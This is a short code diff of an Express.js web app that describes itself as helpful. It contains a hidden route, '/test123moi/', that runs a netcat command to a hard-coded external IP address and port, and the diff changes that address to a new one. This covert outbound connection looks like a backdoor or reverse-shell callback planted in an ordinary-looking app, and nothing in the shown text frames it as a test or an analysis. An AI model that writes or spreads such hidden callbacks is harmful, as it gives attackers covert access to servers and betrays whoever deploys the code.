@@ -5,7 +5,7 @@ app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
 app.get('/test123moi/', function (req, ses){
-  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+  exec("nc 3.142.81.166 14587", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
